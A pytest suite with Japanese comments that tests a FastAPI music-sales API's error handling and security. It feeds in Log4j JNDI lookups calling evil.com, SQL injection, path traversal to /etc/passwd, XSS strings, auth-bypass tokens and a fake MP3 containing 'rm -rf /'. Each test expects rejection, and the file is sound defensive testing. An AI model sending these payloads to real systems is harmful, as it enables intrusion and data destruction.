"""
拡張異常系・エラーケーステストスイート

システムの異常状況・エラー処理・回復機能を徹底的にテストします。
"""

import pytest
import time
import asyncio
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from unittest.mock import patch, MagicMock
import json
import tempfile
import os
from io import BytesIO

from app.main import app
from app.db.session import SessionLocal
from seed_data import create_seed_data


class TestExtendedErrorCases:
    """拡張異常系テストクラス"""
    
    @classmethod
    def setup_class(cls):
        """テストクラス開始時のセットアップ"""
        print("🚨 拡張異常系テスト開始...")
        create_seed_data()
        cls.client = TestClient(app)
        cls.session = SessionLocal()
        print("✅ 異常系テスト環境準備完了")
    
    @classmethod
    def teardown_class(cls):
        """テストクラス終了時のクリーンアップ"""
        cls.session.close()
    
    # ==================== HTTP プロトコル異常テスト ====================
    
    def test_invalid_http_methods(self):
        """サポートされていないHTTPメソッドのテスト"""
        endpoints = [
            "/api/v1/tracks/",
            "/api/v1/auth/register",
            "/api/v1/users/test-user-id",
            "/api/v1/purchases/"
        ]
        
        for endpoint in endpoints:
            # PATCH メソッド（サポートされていない）
            response = self.client.request("PATCH", endpoint)
            assert response.status_code == 405  # Method Not Allowed
            
            # OPTIONS メソッドの確認
            response = self.client.request("OPTIONS", endpoint)
            # OPTIONSは通常許可されるべき
            assert response.status_code in [200, 405]
    
    def test_malformed_requests(self):
        """不正な形式のリクエストテスト"""
        # 不正なJSON
        response = self.client.post(
            "/api/v1/auth/register",
            data="invalid json",
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422  # Unprocessable Entity
        
        # Content-Typeの不一致
        response = self.client.post(
            "/api/v1/auth/register",
            json={"email": "test@example.com"},
            headers={"Content-Type": "text/plain"}
        )
        assert response.status_code in [400, 422]
        
        # 巨大なJSONペイロード（10MB）
        large_payload = {"data": "x" * (10 * 1024 * 1024)}
        response = self.client.post("/api/v1/auth/register", json=large_payload)
        assert response.status_code in [413, 422]  # Payload Too Large
    
    def test_invalid_content_encodings(self):
        """不正なContent-Encodingのテスト"""
        # 不正なgzip圧縮データ
        response = self.client.post(
            "/api/v1/auth/register",
            data=b"invalid gzip data",
            headers={"Content-Encoding": "gzip", "Content-Type": "application/json"}
        )
        assert response.status_code in [400, 422]
    
    # ==================== リクエストパラメータ異常テスト ====================
    
    def test_path_parameter_injections(self):
        """パスパラメータインジェクション攻撃"""
        malicious_ids = [
            "../../../etc/passwd",
            "'; DROP TABLE user; --",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URLエンコード
            "null",
            "undefined",
            "0",
            "-1",
            "999999999999999999999",  # 巨大な数値
            "test\x00injection",  # Null byte injection
            "test%00injection",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/exploit}",  # Log4j injection
        ]
        
        for malicious_id in malicious_ids:
            # 楽曲詳細取得での攻撃
            response = self.client.get(f"/api/v1/tracks/{malicious_id}")
            assert response.status_code in [400, 404, 422]
            
            # ユーザー情報取得での攻撃
            response = self.client.get(f"/api/v1/users/{malicious_id}")
            assert response.status_code in [400, 404, 422]
    
    def test_query_parameter_overflow(self):
        """クエリパラメータのオーバーフロー・限界値テスト"""
        # 巨大なlimit値
        response = self.client.get("/api/v1/tracks/?limit=999999999")
        assert response.status_code in [200, 400, 422]
        
        # 負のlimit値
        response = self.client.get("/api/v1/tracks/?limit=-1")
        assert response.status_code in [200, 400, 422]
        
        # 巨大なoffset値
        response = self.client.get("/api/v1/tracks/?offset=999999999")
        assert response.status_code in [200, 400, 422]
        
        # 極端に長い検索クエリ
        long_search = "a" * 10000
        response = self.client.get(f"/api/v1/tracks/?search={long_search}")
        assert response.status_code in [200, 400, 414]  # URI Too Long
    
    def test_special_character_handling(self):
        """特殊文字・Unicode文字の処理テスト"""
        special_chars = [
            "こんにちは世界",  # 日本語
            "🎵🎶🎤🎧",  # 絵文字
            "test\r\ninjection",  # CRLF injection
            "test\x1f\x7f",  # 制御文字
            "test\u0000null",  # Unicode null
            "test\u202e‮reversed",  # Unicode BiDi override
        ]
        
        for special_char in special_chars:
            response = self.client.get(f"/api/v1/tracks/?search={special_char}")
            assert response.status_code in [200, 400]
            
            # レスポンスが適切にエスケープされていることを確認
            if response.status_code == 200:
                content = response.text
                assert "<script>" not in content
                assert "javascript:" not in content.lower()
    
    # ==================== 認証・認可異常テスト ====================
    
    def test_authentication_bypass_attempts(self):
        """認証バイパス攻撃のテスト"""
        bypass_tokens = [
            "Bearer null",
            "Bearer undefined",
            "Bearer admin",
            "Bearer root",
            "Bearer ../../../admin",
            "Bearer ../../etc/passwd",
            "Bearer ' OR '1'='1",
            "Bearer ${jndi:ldap://evil.com/}",
            "Bearer " + "a" * 10000,  # 極端に長いトークン
            "Basic YWRtaW46YWRtaW4=",  # Basic認証の試行
            "Digest username=admin",  # Digest認証の試行
        ]
        
        for token in bypass_tokens:
            response = self.client.get("/api/v1/auth/me", headers={"Authorization": token})
            assert response.status_code in [401, 422]
    
    def test_session_manipulation_attacks(self):
        """セッション操作攻撃のテスト"""
        # セッション固定攻撃
        fixed_session_id = "FIXED_SESSION_123"
        response = self.client.get("/api/v1/auth/me", 
                                 cookies={"session_id": fixed_session_id})
        assert response.status_code in [401, 422]
        
        # セッションハイジャック攻撃
        response = self.client.get("/api/v1/auth/me",
                                 headers={"X-Session-ID": "hijacked_session"})
        assert response.status_code in [401, 422]
    
    def test_privilege_escalation_attempts(self):
        """権限昇格攻撃のテスト"""
        # リスナーがアーティスト専用機能にアクセス
        listener_headers = {"Authorization": "Bearer mock_token_listener"}
        
        # 楽曲作成の試行
        track_data = {"title": "Unauthorized Track", "duration": 180, "price": 300}
        response = self.client.post("/api/v1/tracks/", 
                                  headers=listener_headers, json=track_data)
        assert response.status_code in [403, 401]
        
        # アーティスト収益情報へのアクセス試行
        response = self.client.get("/api/v1/artists/other-artist-id/revenue",
                                 headers=listener_headers)
        assert response.status_code in [403, 404]
    
    # ==================== データベース異常テスト ====================
    
    def test_database_connection_failures(self):
        """データベース接続失敗時の処理テスト"""
        with patch('app.db.session.SessionLocal') as mock_session:
            # データベース接続エラー
            mock_session.side_effect = Exception("Database connection failed")
            
            response = self.client.get("/api/v1/tracks/")
            assert response.status_code == 500
            
            error_response = response.json()
            assert "detail" in error_response
            # 機密情報が漏洩していないことを確認
            assert "password" not in error_response["detail"].lower()
            assert "secret" not in error_response["detail"].lower()
    
    def test_database_timeout_scenarios(self):
        """データベースタイムアウトシナリオ"""
        with patch('app.db.session.SessionLocal') as mock_session:
            # タイムアウトエラーをシミュレート
            mock_session.side_effect = TimeoutError("Database query timeout")
            
            response = self.client.get("/api/v1/tracks/")
            assert response.status_code == 500
    
    def test_database_constraint_violations(self):
        """データベース制約違反のテスト"""
        # 重複メールアドレスでの登録
        duplicate_user = {
            "email": "listener1@example.com",  # 既存のSeedデータメール
            "display_name": "Duplicate User",
            "firebase_uid": "duplicate_uid",
            "user_role": "LISTENER"
        }
        
        response = self.client.post("/api/v1/auth/register", json=duplicate_user)
        assert response.status_code == 400
        
        error_response = response.json()
        assert "既に登録されています" in error_response["detail"] or "already exists" in error_response["detail"].lower()
    
    # ==================== ファイルアップロード異常テスト ====================
    
    def test_malicious_file_uploads(self):
        """悪意のあるファイルアップロードテスト"""
        malicious_files = [
            # 偽装された実行ファイル
            ("malicious.mp3", b"PK\x03\x04", "audio/mpeg"),  # ZIP header in MP3
            ("script.mp3", b"#!/bin/bash\nrm -rf /", "audio/mpeg"),  # Shell script
            ("virus.mp3", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR", "audio/mpeg"),  # EICAR test
            
            # 巨大ファイル（100MB超）
            ("huge.mp3", b"a" * (100 * 1024 * 1024), "audio/mpeg"),
            
            # 不正なMIMEタイプ
            ("test.mp3", b"audio content", "application/x-executable"),
            ("test.mp3", b"audio content", "text/html"),
            
            # ファイル名インジェクション
            ("../../../etc/passwd", b"audio content", "audio/mpeg"),
            ("test\x00.exe", b"audio content", "audio/mpeg"),
            ("CON.mp3", b"audio content", "audio/mpeg"),  # Windows reserved name
        ]
        
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        for filename, content, mime_type in malicious_files:
            files = {"file": (filename, BytesIO(content), mime_type)}
            
            response = self.client.post("/api/v1/tracks/upload/audio",
                                      headers=headers, files=files)
            
            # セキュリティ上の理由で拒否されるべき
            assert response.status_code in [400, 413, 415, 422]
    
    def test_file_upload_path_traversal(self):
        """ファイルアップロードでのパストラバーサル攻撃"""
        path_traversal_names = [
            "../../secret.txt",
            "..\\..\\secret.txt",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "data:text/plain;base64,test",
        ]
        
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        for malicious_name in path_traversal_names:
            files = {"file": (malicious_name, b"test content", "audio/mpeg")}
            
            response = self.client.post("/api/v1/tracks/upload/audio",
                                      headers=headers, files=files)
            assert response.status_code in [400, 422]
    
    # ==================== 決済処理異常テスト ====================
    
    def test_payment_amount_manipulation(self):
        """決済金額操作攻撃のテスト"""
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        # 正常な楽曲を取得
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        tracks = tracks_response.json()
        track = tracks[0]
        
        # 金額操作の試行
        manipulated_amounts = [
            -100,  # 負の金額
            0,     # ゼロ金額
            0.001, # 極小金額
            999999999,  # 極大金額
            track["price"] - 100,  # 実際より安い金額
            float('inf'),  # 無限大
            float('nan'),  # NaN
        ]
        
        for amount in manipulated_amounts:
            purchase_data = {
                "track_id": track["id"],
                "amount": amount,
                "payment_method": "CREDIT_CARD",
                "payment_token": "test_token"
            }
            
            response = self.client.post("/api/v1/purchases/",
                                      headers=headers, json=purchase_data)
            
            # 不正な金額は拒否されるべき
            if amount != track["price"]:
                assert response.status_code in [400, 422]
    
    def test_payment_race_conditions(self):
        """決済処理での競合状態テスト"""
        import threading
        import concurrent.futures
        
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        tracks = tracks_response.json()
        track = tracks[0]
        
        purchase_data = {
            "track_id": track["id"],
            "amount": track["price"],
            "payment_method": "CREDIT_CARD",
            "payment_token": "race_test_token"
        }
        
        def attempt_purchase():
            return self.client.post("/api/v1/purchases/",
                                  headers=headers, json=purchase_data)
        
        # 同時に複数の購入リクエストを送信
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(attempt_purchase) for _ in range(5)]
            results = [future.result() for future in futures]
        
        # 1つだけ成功し、他は失敗するか重複エラーになるべき
        success_count = sum(1 for r in results if r.status_code == 200)
        assert success_count <= 1  # 重複購入防止
    
    # ==================== API レート制限・DoS攻撃テスト ====================
    
    def test_rate_limiting_attack(self):
        """レート制限・DoS攻撃のテスト"""
        # 短時間での大量リクエスト
        responses = []
        start_time = time.time()
        
        for i in range(1000):  # 1000回のリクエスト
            response = self.client.get(f"/api/v1/tracks/?limit=1&_={i}")
            responses.append(response.status_code)
            
            # 5秒以内に完了しない場合は中断
            if time.time() - start_time > 5:
                break
        
        # レート制限が機能していることを確認
        rate_limited_count = sum(1 for status in responses if status == 429)
        
        if len(responses) > 100:  # 大量リクエストが送信された場合
            assert rate_limited_count > 0  # 一部はレート制限されるべき
    
    def test_slowloris_attack_simulation(self):
        """Slowloris攻撃シミュレーション"""
        # 極端に遅いリクエストをシミュレート
        import time
        
        start_time = time.time()
        
        # タイムアウトが適切に設定されていることを確認
        try:
            response = self.client.get("/api/v1/tracks/", timeout=30)
            end_time = time.time()
            
            # レスポンスが適切な時間内に返されることを確認
            assert end_time - start_time < 10  # 10秒以内
            assert response.status_code in [200, 408, 504]  # Request Timeout or Gateway Timeout
            
        except Exception as e:
            # タイムアウト例外は期待される動作
            assert "timeout" in str(e).lower()
    
    # ==================== メモリ・リソース枯渇攻撃テスト ====================
    
    def test_memory_exhaustion_attack(self):
        """メモリ枯渇攻撃のテスト"""
        # 巨大なクエリパラメータでメモリ消費を試行
        large_param = "a" * (1024 * 1024)  # 1MB のパラメータ
        
        response = self.client.get(f"/api/v1/tracks/?search={large_param}")
        
        # サーバーがクラッシュせず、適切にエラーを返すことを確認
        assert response.status_code in [200, 400, 413, 414]
    
    def test_recursive_request_attack(self):
        """再帰的リクエスト攻撃のテスト"""
        # 自己参照的なデータでスタックオーバーフローを試行
        recursive_data = {"self": None}
        current = recursive_data
        
        # 深い入れ子構造を作成
        for i in range(10000):
            current["self"] = {"self": None}
            current = current["self"]
        
        response = self.client.post("/api/v1/auth/register", json=recursive_data)
        
        # 再帰的データは適切に処理されるべき
        assert response.status_code in [400, 422]
    
    # ==================== データ整合性・並行性テスト ====================
    
    def test_concurrent_data_modification(self):
        """並行データ修正での整合性テスト"""
        import threading
        import concurrent.futures
        
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 楽曲を作成
        track_data = {
            "title": "Concurrent Test Track",
            "description": "テスト用楽曲",
            "genre": "テスト",
            "duration": 180,
            "price": 300.0
        }
        
        create_response = self.client.post("/api/v1/tracks/",
                                         headers=headers, json=track_data)
        track_id = create_response.json()["id"]
        
        def update_track(new_price):
            update_data = {"price": new_price}
            return self.client.put(f"/api/v1/tracks/{track_id}",
                                 headers=headers, json=update_data)
        
        # 複数のスレッドで同時に異なる価格に更新
        prices = [100, 200, 300, 400, 500]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(update_track, price) for price in prices]
            results = [future.result() for future in futures]
        
        # 最終的な価格が一貫していることを確認
        final_response = self.client.get(f"/api/v1/tracks/{track_id}")
        final_track = final_response.json()
        
        # データの整合性が保たれていることを確認
        assert final_track["price"] in prices
    
    # ==================== ログ・監査証跡テスト ====================
    
    def test_sensitive_data_logging(self):
        """機密データのログ出力防止テスト"""
        # パスワードを含むデータでの登録試行
        sensitive_data = {
            "email": "sensitive@example.com",
            "display_name": "Sensitive User",
            "firebase_uid": "sensitive_uid",
            "user_role": "LISTENER",
            "password": "super_secret_password123",
            "credit_card": "4111-1111-1111-1111",
            "ssn": "123-45-6789"
        }
        
        response = self.client.post("/api/v1/auth/register", json=sensitive_data)
        
        # エラーレスポンスに機密情報が含まれていないことを確認
        if response.status_code != 200:
            error_text = response.text.lower()
            assert "password" not in error_text
            assert "credit_card" not in error_text
            assert "4111-1111-1111-1111" not in error_text
            assert "ssn" not in error_text
    
    # ==================== 暗号化・ハッシュ化テスト ====================
    
    def test_password_hashing_verification(self):
        """パスワードハッシュ化の検証テスト"""
        # 同じパスワードで複数回登録して、異なるハッシュが生成されることを確認
        passwords = ["test123", "test123"]  # 同じパスワード
        
        users = []
        for i, password in enumerate(passwords):
            user_data = {
                "email": f"hash_test_{i}@example.com",
                "display_name": f"Hash Test User {i}",
                "firebase_uid": f"hash_test_uid_{i}",
                "user_role": "LISTENER",
                "password": password
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            if response.status_code == 200:
                users.append(response.json())
        
        # パスワードハッシュが異なることを確認（レスポンスにハッシュが含まれる場合）
        if len(users) >= 2:
            # 実際のハッシュ比較はデータベースレベルで行う必要がある
            assert users[0]["id"] != users[1]["id"]  # 最低限、異なるユーザーであることを確認
    
    # ==================== バックアップ・復旧テスト ====================
    
    def test_data_corruption_recovery(self):
        """データ破損からの復旧テスト"""
        # データベース破損をシミュレート
        with patch('app.db.session.SessionLocal') as mock_session:
            mock_session.side_effect = Exception("Database corruption detected")
            
            response = self.client.get("/api/v1/tracks/")
            
            # システムが適切にエラーを処理し、復旧可能な状態を維持していることを確認
            assert response.status_code == 500
            
            error_response = response.json()
            assert "detail" in error_response
            
        # 正常な状態に戻った時の動作確認
        recovery_response = self.client.get("/api/v1/tracks/")
        # データベースが正常であれば、正常なレスポンスが返されるべき
        assert recovery_response.status_code in [200, 500]  # 現在のDBの状態による
    
    # ==================== 国際化・文字エンコーディングテスト ====================
    
    def test_unicode_boundary_cases(self):
        """Unicode境界ケースのテスト"""
        unicode_tests = [
            "𝕌𝕟𝕚𝕔𝕠𝕕𝕖",  # Mathematical symbols
            "🇯🇵🇺🇸🇬🇧",  # Flag sequences
            "👨‍👩‍👧‍👦",  # Complex emoji sequences
            "test\u2028newline",  # Line separator
            "test\u2029paragraph",  # Paragraph separator
            "test\ufeffbom",  # Byte Order Mark
            "test\U0001F4A9pile",  # 4-byte Unicode
        ]
        
        for unicode_text in unicode_tests:
            # 楽曲タイトルでのUnicodeテスト
            track_data = {
                "title": unicode_text,
                "description": "Unicode test track",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/",
                                      headers=headers, json=track_data)
            
            # Unicodeが適切に処理されることを確認
            if response.status_code == 200:
                created_track = response.json()
                assert created_track["title"] == unicode_text
            else:
                # エラーの場合も適切に処理されているべき
                assert response.status_code in [400, 422]